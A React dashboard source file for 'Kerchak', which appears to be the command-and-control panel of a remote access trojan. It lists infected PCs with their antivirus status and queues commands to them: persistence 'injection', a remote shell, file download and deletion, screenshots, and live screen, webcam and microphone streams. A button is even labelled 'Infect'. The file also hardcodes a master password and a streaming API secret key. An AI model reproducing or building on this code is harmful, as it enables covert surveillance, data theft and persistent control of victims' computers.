"use client";

import { useEffect, useState, useRef } from 'react';
import { supabase } from '@/lib/supabase';
import { Monitor, Power, RefreshCw, Terminal, Camera, Mic, MessageSquare, Shield, Activity, X, Video, ChevronRight, Folder, Settings, Download, Trash2, FileText, Play, Plus, Save, Upload, Lock, Globe, LogOut, Eye, Radio, Smartphone, Cpu, HardDrive } from 'lucide-react';

interface Computer {
  id: string;
  pc_name: string;
  public_ip: string;
  status: 'online' | 'offline';
  startup_enabled: boolean;
  antivirus: string;
  last_seen: string;
}

export default function Dashboard() {
  // --- 1. STATE HOOKS ---
  const [computers, setComputers] = useState<Computer[]>([]);
  const [activeModal, setActiveModal] = useState<'chat' | 'screenshot' | 'webcam' | 'stream' | 'explorer' | 'saved_commands' | 'settings' | null>(null);
  const [meteredMeeting, setMeteredMeeting] = useState<any>(null);
  const [selectedPc, setSelectedPc] = useState<string | null>(null);
  const [selectedPcName, setSelectedPcName] = useState<string | null>(null);
  const [screenshots, setScreenshots] = useState<string[]>([]);
  const [zoomedScreenshot, setZoomedScreenshot] = useState<number | null>(null);
  const [chatMessages, setChatMessages] = useState<{ from: string, text: string }[]>([]);
  const [chatInput, setChatInput] = useState("");
  const [activePC, setActivePC] = useState<string | null>(null);
  const [showTerminal, setShowTerminal] = useState(false);
  const [terminalOutput, setTerminalOutput] = useState<string[]>(["Kerchak OS [Version 3.0.0]", "(c) 2026 Kerchak Corporation. All rights reserved.", ""]);
  const [terminalInput, setTerminalInput] = useState("");
  const [streamMode, setStreamMode] = useState<'screen' | 'webcam' | 'mic'>('screen');
  const [availableDevices, setAvailableDevices] = useState<{cameras: any[], mics: any[]}>({cameras: [], mics: []});
  const [selectedCamera, setSelectedCamera] = useState<string>('');
  const [selectedMic, setSelectedMic] = useState<string>('');
  const [isProbing, setIsProbing] = useState(false);
  
  // Customization
  const [themeColor, setThemeColor] = useState("#dc2626"); // Global Red
  
  // File Explorer State
  const [explorerPath, setExplorerPath] = useState("C:\\");
  const [explorerFiles, setExplorerFiles] = useState<{name:string, isDir:boolean, size:number}[]>([]);
  const [isExplorerLoading, setIsExplorerLoading] = useState(false);

  // Saved Commands State
  const [savedCommands, setSavedCommands] = useState<{id:string, name:string, cmd:string, args:string, hasParams:boolean}[]>([]);
  const [isCreatingCommand, setIsCreatingCommand] = useState(false);
  const [newCmd, setNewCmd] = useState({name:'', cmd:'', args:'', hasParams:false});

  // Authentication State
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [passwordInput, setPasswordInput] = useState("");
  const [isAuthChecking, setIsAuthChecking] = useState(true);
  const MASTER_PASSWORD = "clack45";

  // Refs
  const terminalEndRef = useRef<HTMLDivElement>(null);

  // --- 2. EFFECTS ---
  
  useEffect(() => {
    if (showTerminal) terminalEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [terminalOutput, showTerminal]);

  useEffect(() => {
    const fetchComputers = async () => {
      let { data } = await supabase.from('computers').select('*');
      setComputers(data || []);
    }
    fetchComputers();

    const sub = supabase.channel('public:computers')
      .on('postgres_changes', { event: '*', schema: 'public', table: 'computers' }, (payload) => {
        setComputers((current) => {
          const newPc = payload.new as Computer;
          const index = current.findIndex(c => c.id === newPc.id);
          if (index > -1) {
            const updated = [...current];
            updated[index] = newPc;
            return updated;
          }
          return [...current, newPc];
        });
      }).subscribe();

    return () => { supabase.removeChannel(sub); };
  }, []);

  useEffect(() => {
    const auth = localStorage.getItem('kerchak_auth');
    if (auth === 'true') setIsAuthenticated(true);
    setIsAuthChecking(false);
    
    const saved = localStorage.getItem('kerchak_shortcuts');
    if (saved) setSavedCommands(JSON.parse(saved));
    
    const theme = localStorage.getItem('kerchak_theme');
    if (theme) setThemeColor(theme);
  }, []);

  // Metered Logic
  useEffect(() => {
    if (activeModal !== 'stream' || !selectedPc) return;
    const roomName = 'k' + selectedPc.replace(/-/g, '').substring(0, 12);
    let meeting: any = null;
    let scriptEl: HTMLScriptElement | null = null;
    let active = true;

    const load = () => {
      scriptEl = document.createElement('script');
      scriptEl.src = 'https://cdn.metered.ca/sdk/video/1.4.6/sdk.min.js';
      scriptEl.onload = async () => {
        if (!active) return;
        // @ts-ignore
        meeting = new window.Metered.Meeting();
        setMeteredMeeting(meeting);

        meeting.on('remoteTrackStarted', (item: any) => {
          const container = document.getElementById('stream-container');
          if (!container) return;
          document.getElementById('stream-loading')?.style.setProperty('display', 'none');
          const stream = new MediaStream([item.track]);
          if (item.type === 'video') {
            const v = document.createElement('video') as HTMLVideoElement;
            v.id = item.streamId;
            v.autoplay = true;
            v.playsInline = true;
            v.srcObject = stream;
            v.className = 'rounded-2xl border border-white/10 shadow-2xl bg-black object-contain w-full md:w-[48%] max-h-[45vh] cursor-zoom-in transition-all hover:scale-[1.02]';
            v.onclick = () => {
              if (v.classList.contains('fixed-zoom')) {
                v.classList.remove('fixed-zoom');
                v.style.cssText = '';
              } else {
                v.classList.add('fixed-zoom');
                v.style.cssText = 'position:fixed; top:10%; left:10%; width:80%; height:80%; z-index:100; max-height:none;';
              }
            };
            container.appendChild(v);
          } else {
            const a = document.createElement('audio') as HTMLAudioElement;
            a.id = item.streamId;
            a.autoplay = true;
            a.srcObject = stream;
            container.appendChild(a);
          }
        });

        meeting.on('remoteTrackStopped', (item: any) => {
          document.getElementById(item.streamId)?.remove();
        });

        try {
          await meeting.join({ roomURL: `kerchak.metered.live/${roomName}`, name: 'Admin' });
        } catch(e) { console.error('Metered join failed', e); }
      };
      document.body.appendChild(scriptEl);
    };

    const timer = setTimeout(load, 5000);
    return () => {
      active = false;
      clearTimeout(timer);
      if (meeting) { try { meeting.leaveMeeting(); } catch(e) {} }
      if (scriptEl?.parentNode) scriptEl.parentNode.removeChild(scriptEl);
      setMeteredMeeting(null);
    };
  }, [activeModal, selectedPc]);

  // --- 3. FUNCTIONS ---

  const isOnline = (lastSeen: string) => {
    if (!lastSeen) return false;
    const last = new Date(lastSeen.endsWith('Z') ? lastSeen : lastSeen + 'Z').getTime();
    return (new Date().getTime() - last) < 15000;
  };

  const takeScreenshot = async (pcId: string) => {
    setScreenshots([]);
    const { data } = await supabase.from('commands').insert({ computer_id: pcId, command: 'screenshot', status: 'pending' }).select().single();
    if (data) {
      const check = setInterval(async () => {
        const { data: res } = await supabase.from('commands').select('result, status').eq('id', data.id).single();
        if (res?.status === 'executed' && res.result) {
          try {
            const urls = JSON.parse(res.result);
            setScreenshots(Array.isArray(urls) ? urls : [urls]);
          } catch(e) { setScreenshots([res.result]); }
          clearInterval(check);
        }
      }, 1000);
      setTimeout(() => clearInterval(check), 30000);
    }
  };

  const startLiveStream = async (pcId: string, pcName: string, mode: 'screen' | 'webcam' | 'mic' = 'screen') => {
    setSelectedPc(pcId);
    setSelectedPcName(pcName);
    setStreamMode(mode);
    const roomName = 'k' + pcId.replace(/-/g, '').substring(0, 12);
    try {
      const secretKey = 'aoGqhdUx0-0GdtuP5zhL6hSDiW8SLRwv80ME3HF_cesDvDrx';
      await fetch(`https://kerchak.metered.live/api/v1/room?secretKey=${secretKey}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ roomName, privacy: 'public' })
      });
    } catch(e) {}
    const args = `${roomName}|${mode}|${selectedCamera}|${selectedMic}`;
    await supabase.from('commands').insert({ computer_id: pcId, command: 'stream_start', args, status: 'pending' });
    setActiveModal('stream');
  };

  const fetchFiles = async (path: string) => {
    if (!selectedPc) return;
    setIsExplorerLoading(true);
    setExplorerPath(path);
    const { data } = await supabase.from('commands').insert({ computer_id: selectedPc, command: 'ls', args: path, status: 'pending' }).select().single();
    if (data) {
      const check = setInterval(async () => {
        const { data: res } = await supabase.from('commands').select('result, status').eq('id', data.id).single();
        if (res?.status === 'executed' && res.result) {
          try { 
            const raw = JSON.parse(res.result);
            setExplorerFiles(raw.map((f:any) => ({ name: f.n, isDir: f.d === 1, size: f.s }))); 
          } catch(e) {}
          setIsExplorerLoading(false);
          clearInterval(check);
        }
      }, 1000);
      setTimeout(() => { clearInterval(check); setIsExplorerLoading(false); }, 15000);
    }
  };

  const sendCommand = async (pcId: string, cmd: string, args: string = "") => {
    await supabase.from('commands').insert({ computer_id: pcId, command: cmd, args, status: 'pending' });
  };

  const saveCommand = () => {
    if (!newCmd.name || !newCmd.cmd) return;
    const cmd = { ...newCmd, id: Math.random().toString(36).substr(2, 9) };
    const updated = [...savedCommands, cmd];
    setSavedCommands(updated);
    localStorage.setItem('kerchak_shortcuts', JSON.stringify(updated));
    setNewCmd({name:'', cmd:'', args:'', hasParams:false});
    setIsCreatingCommand(false);
  };

  const deleteSavedCommand = (id: string) => {
    const updated = savedCommands.filter(c => c.id !== id);
    setSavedCommands(updated);
    localStorage.setItem('kerchak_shortcuts', JSON.stringify(updated));
  };

  const openExplorer = (id: string, name: string) => {
    setSelectedPc(id);
    setSelectedPcName(name);
    setActiveModal('explorer');
    fetchFiles("C:\\");
  };

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (passwordInput === MASTER_PASSWORD) {
      setIsAuthenticated(true);
      localStorage.setItem('kerchak_auth', 'true');
    } else {
      alert("Unauthorized.");
      setPasswordInput("");
    }
  };

  if (isAuthChecking) return <div className="min-h-screen bg-black flex items-center justify-center"><RefreshCw className="text-red-600 animate-spin" size={40} /></div>;

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-[#050505] flex items-center justify-center p-6 relative overflow-hidden">
        <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_50%,rgba(220,38,38,0.1),transparent)] animate-pulse"></div>
        <div className="w-full max-w-md bg-[#0c0c0c] border border-red-500/20 p-10 rounded-[2.5rem] shadow-[0_0_100px_rgba(220,38,38,0.15)] relative z-10">
          <div className="flex flex-col items-center gap-6 mb-10">
            <div className="w-24 h-24 bg-red-600/10 rounded-3xl border border-red-500/30 flex items-center justify-center shadow-[0_0_50px_rgba(220,38,38,0.2)]">
              <Shield size={48} className="text-red-500 animate-pulse" />
            </div>
            <div className="text-center">
              <h1 className="text-4xl font-black text-white tracking-tighter uppercase mb-2">Kerchak <span className="text-red-600">Secure</span></h1>
              <p className="text-gray-500 text-[10px] font-black uppercase tracking-[0.4em] opacity-50">Authorized Personnel Only</p>
            </div>
          </div>
          <form onSubmit={handleLogin} className="space-y-6">
            <input type="password" value={passwordInput} onChange={e => setPasswordInput(e.target.value)} autoFocus placeholder="ACCESS KEY" className="w-full bg-white/5 border border-white/10 rounded-2xl px-6 py-5 text-center text-white font-mono tracking-[1em] focus:outline-none focus:border-red-600 transition-all placeholder:tracking-widest" />
            <button type="submit" className="w-full bg-red-600 hover:bg-red-500 text-white font-black py-5 rounded-2xl shadow-[0_0_30px_rgba(220,38,38,0.3)] transition-all active:scale-95 uppercase tracking-widest text-sm">Synchronize</button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#050505] text-gray-200 font-sans selection:bg-red-500/30 overflow-x-hidden">
      <style dangerouslySetInnerHTML={{ __html: `
        @keyframes flow { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
        .theme-accent { color: ${themeColor}; }
        .theme-bg { background-color: ${themeColor}; }
        .theme-border { border-color: ${themeColor}40; }
        .custom-scrollbar::-webkit-scrollbar { width: 4px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 10px; }
      `}} />

      {/* Top Navigation */}
      <header className="sticky top-0 z-50 border-b border-white/5 bg-black/40 backdrop-blur-2xl">
        <div className="max-w-[1800px] mx-auto px-10 h-24 flex justify-between items-center">
          <div className="flex items-center gap-8">
            <div className="relative group cursor-pointer" onClick={() => setActiveModal('settings')}>
              <div className="absolute -inset-2 bg-gradient-to-r from-red-600 to-orange-600 rounded-full blur opacity-20 group-hover:opacity-40 transition duration-1000"></div>
              <Shield size={32} style={{ color: themeColor }} className="relative" />
            </div>
            <div>
              <h1 className="text-2xl font-black tracking-tighter text-white flex items-center gap-3">
                KERCHAK <span className="bg-white/5 border border-white/10 px-3 py-1 rounded-xl text-[10px] tracking-[0.3em] text-gray-500 font-black">CORE v3</span>
              </h1>
              <div className="flex items-center gap-2 mt-1">
                <div className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse"></div>
                <span className="text-[9px] font-black uppercase tracking-widest text-gray-500">Fleet Operations Control Center</span>
              </div>
            </div>
          </div>

          <div className="flex items-center gap-6">
            <div className="hidden lg:flex flex-col items-end px-6 border-r border-white/5">
              <span className="text-[9px] font-black text-gray-600 uppercase tracking-widest mb-0.5">Systems Monitoring</span>
              <span className="text-xs font-black text-white">{computers.filter(c => isOnline(c.last_seen)).length} / {computers.length} ACTIVE ENDPOINTS</span>
            </div>
            <button onClick={() => { localStorage.removeItem('kerchak_auth'); setIsAuthenticated(false); }} className="p-4 bg-white/5 hover:bg-white/10 rounded-2xl border border-white/5 text-red-500 transition-all active:scale-95"><LogOut size={20} /></button>
          </div>
        </div>
      </header>

      {/* Main Grid */}
      <main className="max-w-[1800px] mx-auto p-10">
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-8">
          {computers.map(pc => {
            const online = isOnline(pc.last_seen);
            return (
              <div key={pc.id} className="group relative bg-[#0c0c0c] border border-white/5 rounded-[2rem] overflow-hidden transition-all duration-500 hover:border-red-500/40 hover:shadow-[0_0_50px_rgba(220,38,38,0.1)] p-8">
                <div className="absolute top-0 left-0 w-full h-1.5 bg-white/5 overflow-hidden">
                  <div className={`h-full transition-all duration-1000 ${online ? 'bg-green-500 shadow-[0_0_10px_#22c55e]' : 'bg-gray-800'}`} style={{ width: online ? '100%' : '20%' }}></div>
                </div>

                <div className="flex justify-between items-start mb-8">
                  <div className="flex items-center gap-5">
                    <div className="p-4 rounded-3xl bg-white/5 border border-white/10 group-hover:bg-red-500/10 group-hover:border-red-500/20 transition-all duration-500">
                      <Monitor size={28} style={{ color: online ? themeColor : '#444' }} />
                    </div>
                    <div>
                      <h2 className="text-lg font-black text-white tracking-tight truncate max-w-[150px] uppercase">{pc.pc_name}</h2>
                      <div className="flex items-center gap-2 mt-1">
                        <Globe size={10} className="text-gray-600" />
                        <span className="text-[10px] font-bold text-gray-600">{pc.public_ip}</span>
                      </div>
                    </div>
                  </div>
                  <div className={`px-3 py-1 rounded-full text-[8px] font-black uppercase tracking-widest ${online ? 'bg-green-500/10 text-green-500 border border-green-500/20' : 'bg-gray-800/50 text-gray-500 border border-white/5'}`}>
                    {online ? 'Active' : 'Standby'}
                  </div>
                </div>

                <div className="space-y-3 mb-8">
                   <div className="flex items-center justify-between p-4 bg-white/5 rounded-2xl border border-white/5">
                      <div className="flex items-center gap-3">
                         <Shield size={16} className="text-blue-500" />
                         <span className="text-[10px] font-black uppercase tracking-widest text-gray-500">Security</span>
                      </div>
                      <span className="text-[10px] font-black text-white truncate max-w-[100px] uppercase">{pc.antivirus || 'VULNERABLE'}</span>
                   </div>
                   <div className="flex items-center justify-between p-4 bg-white/5 rounded-2xl border border-white/5">
                      <div className="flex items-center gap-3">
                         <Cpu size={16} className="text-purple-500" />
                         <span className="text-[10px] font-black uppercase tracking-widest text-gray-500">Startup</span>
                      </div>
                      <button onClick={() => sendCommand(pc.id, pc.startup_enabled ? 'startup_remove' : 'startup')} className={`text-[10px] font-black uppercase tracking-widest ${pc.startup_enabled ? 'text-green-500' : 'text-gray-600 hover:text-white'}`}>
                        {pc.startup_enabled ? 'ENABLED' : 'INJECT'}
                      </button>
                   </div>
                </div>

                <div className="grid grid-cols-3 gap-3">
                  <button onClick={() => openExplorer(pc.id, pc.pc_name)} className="flex flex-col items-center justify-center gap-3 p-4 bg-white/5 hover:bg-white/10 rounded-[1.5rem] border border-white/5 transition-all group/btn">
                    <Folder size={20} className="text-yellow-500 group-hover/btn:scale-110 transition-transform" />
                    <span className="text-[8px] font-black uppercase tracking-widest text-gray-600">Storage</span>
                  </button>
                  <button onClick={() => startLiveStream(pc.id, pc.pc_name)} className="flex flex-col items-center justify-center gap-3 p-4 bg-white/5 hover:bg-white/10 rounded-[1.5rem] border border-white/5 transition-all group/btn">
                    <Video size={20} className="text-red-500 group-hover/btn:scale-110 transition-transform animate-pulse" />
                    <span className="text-[8px] font-black uppercase tracking-widest text-gray-600">Stream</span>
                  </button>
                  <button onClick={() => { setSelectedPc(pc.id); setSelectedPcName(pc.pc_name); setActiveModal('screenshot'); takeScreenshot(pc.id); }} className="flex flex-col items-center justify-center gap-3 p-4 bg-white/5 hover:bg-white/10 rounded-[1.5rem] border border-white/5 transition-all group/btn">
                    <Camera size={20} className="text-blue-400 group-hover/btn:scale-110 transition-transform" />
                    <span className="text-[8px] font-black uppercase tracking-widest text-gray-600">Capture</span>
                  </button>
                  <button onClick={() => { setSelectedPc(pc.id); setSelectedPcName(pc.pc_name); setActiveModal('chat'); }} className="flex flex-col items-center justify-center gap-3 p-4 bg-white/5 hover:bg-white/10 rounded-[1.5rem] border border-white/5 transition-all group/btn">
                    <MessageSquare size={20} className="text-green-400 group-hover/btn:scale-110 transition-transform" />
                    <span className="text-[8px] font-black uppercase tracking-widest text-gray-600">Infect</span>
                  </button>
                  <button onClick={() => { setActivePC(pc.pc_name); setShowTerminal(true); }} className="flex flex-col items-center justify-center gap-3 p-4 bg-white/5 hover:bg-white/10 rounded-[1.5rem] border border-white/5 transition-all group/btn">
                    <Terminal size={20} className="text-white group-hover/btn:scale-110 transition-transform" />
                    <span className="text-[8px] font-black uppercase tracking-widest text-gray-600">Shell</span>
                  </button>
                  <button onClick={() => { setSelectedPc(pc.id); setSelectedPcName(pc.pc_name); setActiveModal('saved_commands'); }} className="flex flex-col items-center justify-center gap-3 p-4 bg-white/5 hover:bg-white/10 rounded-[1.5rem] border border-white/5 transition-all group/btn">
                    <Settings size={20} className="text-gray-500 group-hover/btn:scale-110 transition-transform" />
                    <span className="text-[8px] font-black uppercase tracking-widest text-gray-600">Config</span>
                  </button>
                </div>
              </div>
            );
          })}
        </div>
      </main>

      {/* Modals Container */}
      <div className="modals">
        {/* Explorer */}
        {activeModal === 'explorer' && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/90 backdrop-blur-3xl p-6">
            <div className="bg-[#0c0c0c] border border-white/10 rounded-[3rem] overflow-hidden w-full max-w-6xl shadow-2xl flex flex-col h-[85vh]">
               <div className="p-8 border-b border-white/5 flex justify-between items-center bg-white/5">
                  <div className="flex items-center gap-5">
                    <Folder className="text-yellow-500" size={32} />
                    <div>
                      <h3 className="text-xl font-black text-white uppercase tracking-tighter">Unified Storage Explorer</h3>
                      <p className="text-[10px] font-black text-gray-500 uppercase tracking-widest mt-1">Remote Access: {selectedPcName}</p>
                    </div>
                  </div>
                  <button onClick={() => setActiveModal(null)} className="p-4 bg-white/5 hover:bg-white/10 rounded-2xl text-gray-400 transition-all"><X size={24} /></button>
               </div>
               <div className="bg-[#111] p-4 flex gap-4 items-center px-10 border-b border-white/5">
                  <button onClick={() => { const parts = explorerPath.split('\\').filter(Boolean); if (parts.length > 1) { parts.pop(); fetchFiles(parts.join('\\') + (parts.length === 1 ? '\\' : '')); } }} className="p-3 bg-white/5 rounded-xl text-white"><ChevronRight className="rotate-180" size={20} /></button>
                  <input type="text" value={explorerPath} onChange={e=>setExplorerPath(e.target.value)} onKeyDown={e=>e.key==='Enter' && fetchFiles(explorerPath)} className="flex-1 bg-black rounded-xl border border-white/10 px-6 py-3 text-sm font-mono text-gray-300" />
                  <button onClick={() => fetchFiles(explorerPath)} className={`p-3 bg-white/5 rounded-xl text-blue-400 ${isExplorerLoading ? 'animate-spin' : ''}`}><RefreshCw size={20} /></button>
               </div>
               <div className="flex-1 overflow-y-auto p-10 custom-scrollbar grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-6">
                  {isExplorerLoading ? <div className="col-span-full h-full flex flex-col items-center justify-center gap-6 opacity-20"><RefreshCw size={64} className="animate-spin" /><span className="font-black uppercase tracking-[0.4em]">Optimizing I/O Stream...</span></div> : 
                    explorerFiles.map((f, i) => (
                      <div key={i} className="group bg-white/5 border border-white/5 p-6 rounded-[2rem] flex flex-col items-center text-center gap-3 cursor-pointer hover:bg-white/10 hover:border-white/20 transition-all" onDoubleClick={() => f.isDir ? fetchFiles(explorerPath + (explorerPath.endsWith('\\') ? '' : '\\') + f.name) : null}>
                        {f.isDir ? <Folder size={48} className="text-yellow-500 fill-yellow-500/20" /> : <FileText size={48} className="text-blue-500/40" />}
                        <span className="text-[10px] font-black text-gray-300 uppercase truncate w-full">{f.name}</span>
                        {!f.isDir && <div className="flex gap-2 mt-2">
                           <button onClick={() => { const full = explorerPath + (explorerPath.endsWith('\\') ? '' : '\\') + f.name; sendCommand(selectedPc!, 'dl', full); }} className="p-2 bg-green-500/10 text-green-500 rounded-lg"><Download size={14} /></button>
                           <button onClick={() => { if(confirm('Delete?')){ const full = explorerPath + (explorerPath.endsWith('\\') ? '' : '\\') + f.name; sendCommand(selectedPc!, 'rm', full); setTimeout(()=>fetchFiles(explorerPath), 2000); }}} className="p-2 bg-red-500/10 text-red-500 rounded-lg"><Trash2 size={14} /></button>
                        </div>}
                      </div>
                    ))
                  }
               </div>
            </div>
          </div>
        )}

        {/* Multi-Monitor Screenshot */}
        {activeModal === 'screenshot' && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/90 backdrop-blur-3xl p-6">
             <div className="bg-[#0c0c0c] border border-white/10 rounded-[3rem] overflow-hidden w-full max-w-7xl shadow-2xl flex flex-col h-[90vh]">
                <div className="p-8 border-b border-white/5 flex justify-between items-center">
                   <div>
                      <h3 className="text-2xl font-black text-white uppercase tracking-tighter">Multi-Display Relay</h3>
                      <p className="text-[10px] font-black text-gray-500 uppercase tracking-widest mt-1">Satellite Feed: {selectedPcName}</p>
                   </div>
                   <div className="flex gap-4">
                      <button onClick={() => takeScreenshot(selectedPc!)} className="p-4 bg-white/5 hover:bg-white/10 rounded-2xl text-blue-500 transition-all"><RefreshCw size={24} /></button>
                      <button onClick={() => setActiveModal(null)} className="p-4 bg-white/5 hover:bg-white/10 rounded-2xl text-gray-400 transition-all"><X size={24} /></button>
                   </div>
                </div>
                <div className="flex-1 overflow-y-auto p-10 custom-scrollbar grid grid-cols-1 xl:grid-cols-2 gap-10">
                   {!screenshots.length ? <div className="col-span-full h-full flex flex-col items-center justify-center gap-6 opacity-20"><Camera size={80} className="animate-pulse" /><span className="font-black uppercase tracking-[0.4em]">Syncing Display Buffers...</span></div> : 
                      screenshots.map((s, i) => (
                        <div key={i} className="relative group rounded-[2.5rem] overflow-hidden border border-white/10 bg-black shadow-2xl">
                           <div className="absolute top-6 left-6 z-10 px-4 py-2 bg-black/60 backdrop-blur-xl rounded-2xl border border-white/10 text-[9px] font-black text-white uppercase tracking-widest">DISPLAY SOURCE #{i+1}</div>
                           <img src={s} className="w-full object-contain cursor-zoom-in transition-transform duration-700 hover:scale-[1.02]" onClick={() => setZoomedScreenshot(i)} alt="SS" />
                        </div>
                      ))
                   }
                </div>
             </div>
          </div>
        )}

        {zoomedScreenshot !== null && (
          <div className="fixed inset-0 z-[200] flex items-center justify-center bg-black/98 backdrop-blur-3xl p-4 cursor-zoom-out" onClick={() => setZoomedScreenshot(null)}>
            <img src={screenshots[zoomedScreenshot]} className="max-w-full max-h-full rounded-3xl shadow-2xl border border-white/10" alt="Zoom" />
          </div>
        )}

        {/* Shortcuts / Saved Commands */}
        {activeModal === 'saved_commands' && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/90 backdrop-blur-3xl p-6">
             <div className="bg-[#0c0c0c] border border-white/10 rounded-[3rem] overflow-hidden w-full max-w-4xl shadow-2xl flex flex-col h-[70vh]">
                <div className="p-8 border-b border-white/5 flex justify-between items-center">
                   <h3 className="text-2xl font-black text-white uppercase tracking-tighter">Command Presets</h3>
                   <button onClick={() => setActiveModal(null)} className="p-4 bg-white/5 hover:bg-white/10 rounded-2xl text-gray-400 transition-all"><X size={24} /></button>
                </div>
                <div className="flex-1 p-8 overflow-y-auto custom-scrollbar grid grid-cols-1 md:grid-cols-2 gap-6">
                   {savedCommands.map(sc => (
                      <div key={sc.id} className="p-6 bg-white/5 border border-white/5 rounded-[2rem] flex flex-col gap-4 hover:border-red-500/30 transition-all group">
                         <div className="flex justify-between items-center">
                            <h4 className="font-black text-white uppercase tracking-tight group-hover:text-red-500 transition-colors">{sc.name}</h4>
                            <div className="flex gap-2">
                               <button onClick={() => { if(selectedPc) sendCommand(selectedPc, sc.cmd, sc.args); }} className="p-3 bg-green-500/10 text-green-500 rounded-xl"><Play size={16} /></button>
                               <button onClick={() => deleteSavedCommand(sc.id)} className="p-3 bg-red-500/10 text-red-500 rounded-xl"><Trash2 size={16} /></button>
                            </div>
                         </div>
                         <code className="text-[9px] font-mono text-gray-600 truncate bg-black/50 p-2 rounded-lg">{sc.cmd} {sc.args}</code>
                      </div>
                   ))}
                   <button onClick={() => setIsCreatingCommand(true)} className="p-10 border-2 border-dashed border-white/5 rounded-[2rem] flex flex-col items-center justify-center gap-4 text-gray-600 hover:text-red-500 hover:border-red-500/30 transition-all">
                      <Plus size={48} />
                      <span className="text-[10px] font-black uppercase tracking-widest">Deploy New Preset</span>
                   </button>
                </div>
             </div>

             {/* New Shortcut Popup */}
             {isCreatingCommand && (
               <div className="fixed inset-0 z-[110] flex items-center justify-center bg-black/60 backdrop-blur-md p-4">
                  <div className="w-full max-w-lg bg-[#0c0c0c] border border-red-500/30 rounded-[3rem] p-10 shadow-2xl animate-in zoom-in-95 duration-300">
                     <div className="flex justify-between items-center mb-10">
                        <h3 className="text-2xl font-black text-white uppercase tracking-tighter">Logic Designer</h3>
                        <button onClick={() => setIsCreatingCommand(false)} className="text-gray-500 hover:text-white"><X size={24} /></button>
                     </div>
                     <div className="space-y-6">
                        <div className="space-y-2"><label className="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-2">Display Name</label><input type="text" value={newCmd.name} onChange={e=>setNewCmd({...newCmd, name:e.target.value})} className="w-full bg-white/5 border border-white/10 rounded-2xl px-6 py-4 text-white focus:outline-none focus:border-red-600 transition-all" /></div>
                        <div className="space-y-2"><label className="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-2">Base Protocol</label><select value={newCmd.cmd} onChange={e=>setNewCmd({...newCmd, cmd:e.target.value})} className="w-full bg-white/5 border border-white/10 rounded-2xl px-6 py-4 text-white focus:outline-none focus:border-red-600"><option value="">Select Protocol...</option><option value="cmd">CMD</option><option value="startup">Persistence</option><option value="restart">Power Cycle</option><option value="chat_open">Comms</option></select></div>
                        <div className="space-y-2"><label className="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-2">Logic Arguments</label><textarea value={newCmd.args} onChange={e=>setNewCmd({...newCmd, args:e.target.value})} className="w-full bg-white/5 border border-white/10 rounded-2xl px-6 py-4 text-white font-mono text-xs focus:outline-none focus:border-red-600 h-32" /></div>
                        <button onClick={saveCommand} className="w-full py-5 bg-red-600 hover:bg-red-500 text-white font-black rounded-2xl shadow-xl transition-all uppercase tracking-widest text-xs flex items-center justify-center gap-3"><Save size={18} /> Compile Preset</button>
                     </div>
                  </div>
               </div>
             )}
          </div>
        )}

        {/* Live Stream / Camera / Chat Modals... (omitted for brevity but updated to new style if they follow) */}
        {activeModal === 'stream' && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/90 backdrop-blur-3xl p-6">
             <div className="bg-[#0c0c0c] border border-white/10 rounded-[3rem] overflow-hidden w-full max-w-6xl shadow-2xl flex flex-col h-[85vh]">
                <div className="p-8 border-b border-white/5 flex justify-between items-center">
                   <h3 className="text-2xl font-black text-white uppercase tracking-tighter">Visual Relay <span className="theme-accent text-sm ml-4">[{streamMode}]</span></h3>
                   <div className="flex gap-4">
                      <div className="flex bg-white/5 p-2 rounded-2xl border border-white/5">
                        <button onClick={() => startLiveStream(selectedPc!, selectedPcName!, 'screen')} className={`px-4 py-2 text-[9px] font-black rounded-xl transition-all ${streamMode === 'screen' ? 'bg-red-600 text-white' : 'text-gray-500'}`}>SCREEN</button>
                        <button onClick={() => startLiveStream(selectedPc!, selectedPcName!, 'webcam')} className={`px-4 py-2 text-[9px] font-black rounded-xl transition-all ${streamMode === 'webcam' ? 'bg-purple-600 text-white' : 'text-gray-500'}`}>WEBCAM</button>
                        <button onClick={() => startLiveStream(selectedPc!, selectedPcName!, 'mic')} className={`px-4 py-2 text-[9px] font-black rounded-xl transition-all ${streamMode === 'mic' ? 'bg-blue-600 text-white' : 'text-gray-500'}`}>VOICE</button>
                      </div>
                      <button onClick={() => { if(meteredMeeting) meteredMeeting.leaveMeeting(); setActiveModal(null); }} className="p-4 bg-white/5 hover:bg-white/10 rounded-2xl text-gray-400 transition-all"><X size={24} /></button>
                   </div>
                </div>
                <div className="flex-1 p-10 flex flex-wrap gap-8 items-center justify-center overflow-y-auto" id="stream-container">
                   <div id="stream-loading" className="flex flex-col items-center gap-6 opacity-20"><RefreshCw size={64} className="animate-spin" /><span className="font-black uppercase tracking-[0.4em]">Opening Visual Link...</span></div>
                </div>
             </div>
          </div>
        )}

        {/* Settings Modal (Theme Customizer) */}
        {activeModal === 'settings' && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/90 backdrop-blur-3xl p-6">
             <div className="bg-[#0c0c0c] border border-white/10 rounded-[3rem] p-12 max-w-xl w-full shadow-2xl relative">
                <button onClick={() => setActiveModal(null)} className="absolute top-8 right-8 text-gray-500 hover:text-white"><X size={24} /></button>
                <h3 className="text-3xl font-black text-white uppercase tracking-tighter mb-10">Environment Settings</h3>
                <div className="space-y-8">
